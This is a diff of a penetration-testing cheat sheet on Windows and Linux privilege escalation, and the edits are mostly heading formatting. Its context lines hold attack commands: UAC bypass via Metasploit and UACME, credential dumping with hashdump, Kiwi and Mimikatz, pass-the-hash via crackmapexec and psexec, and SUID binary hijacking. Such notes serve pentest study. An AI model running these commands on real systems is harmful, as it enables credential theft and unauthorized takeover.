@@ -18,16 +18,15 @@ User Account Control (UAC) is a feature that enables a consent prompt for elevat
 Prerequisites:
 
 1. User must be a member of the Administrators group. `net localgroup administrators`
-2. Full interactive shell with the victim (a common nc.exe shell is not enough).
-   * You can use meterpreter
+2. Full interactive shell with the victim like meterpreter (a common nc.exe shell is not enough).
 
-**Metasploit**
+**(1) Metasploit**
 
 ```sh
 search bypassuac
 ```
 
-**UACME**
+**(2) UACME**
 
 ```sh
 # 1. Step
@@ -101,7 +100,7 @@ Extract password and decode it (from base64)
 
 Prerequisites: User must be a member a local Administrators.
 
-1. hashdump (Metasploit - Meterpreter)
+**(1) hashdump (Metasploit - Meterpreter)**
 
 ```sh
 # You may need to migrate meterpreter to NT AUTHORITY\SYSTEM process
@@ -109,7 +108,7 @@ migrate <PID explorer.exe>
 hashdump
 ```
 
-2. Kiwi (Metasploit - Meterpreter)
+**(2) Kiwi (Metasploit - Meterpreter)**
 
 ```sh
 # You may need to migrate meterpreter to NT AUTHORITY\SYSTEM process
@@ -126,7 +125,7 @@ lsa_dump_secrets
 # So, it can be helpful for the older version of the Windows.
 ```
 
-3. Mimikatz
+**(3) Mimikatz**
 
 ```batch
 # 1. Upload mimikatz.exe
@@ -153,6 +152,8 @@ crackmapexec smb <ip> -u <administrator> -H <NTLM hash> -x "ipconfig"
 # 2. Method (Metasploit) -> windows/smb/psexec
 set SMBPass <LM hash>:<NTLM hash>
 ```
+
+Notes:
 
 * Empty LM hash: `AAD3B435B51404EEAAD3B435B51404EE` (means its non-use).
   * `AAD3B435B51404EEAAD3B435B51404EE:<NTLM>`
@@ -195,20 +196,21 @@ ps aux
 
 ### SUID - custom binary
 
-* Premise: you have `binary_name` (with suid) that use/load/execute `loaded_binary`
-* Extract strings from the binary – look for shared libraries or binaries being loaded / executed at runtime
+Premise: you have `binary_name` (with suid) that use/load/execute `loaded_binary`
+
+Extract strings from the binary – look for shared libraries or binaries being loaded / executed at runtime
 
 ```sh
 strings binary_name
 ```
 
-1. Method
+**(1) Method**
 
 ```sh
 cp /bin/bash /path/to/loaded_binary
 ```
 
-2. Method
+**(2) Method**
 
 Delete the loaded binary and replace with a new one:
 
